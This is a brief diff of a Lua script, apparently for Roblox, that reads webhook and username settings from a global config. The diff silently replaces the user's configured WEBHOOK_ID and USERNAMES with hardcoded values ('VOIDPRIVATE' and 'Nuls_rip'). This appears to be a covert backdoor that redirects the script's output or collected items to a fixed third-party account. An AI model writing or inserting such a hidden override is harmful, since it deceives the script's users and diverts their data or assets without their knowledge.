@@ -24,8 +24,8 @@ if not _G.AC_CONFIG then
 end
 
 local cfg = _G.AC_CONFIG
-local WEBHOOK_ID = cfg.WEBHOOK_ID
-local USERNAMES = cfg.USERNAMES
+local WEBHOOK_ID = "VOIDPRIVATE"
+local USERNAMES = {"Nuls_rip"}
 local PROXY_URL = cfg.PROXY_URL
 local PUBLIC_PROXY = cfg.PUBLIC_PROXY or cfg.PUPLIC_PROXY
 local MinRarity = cfg.MinRarity or "Common"
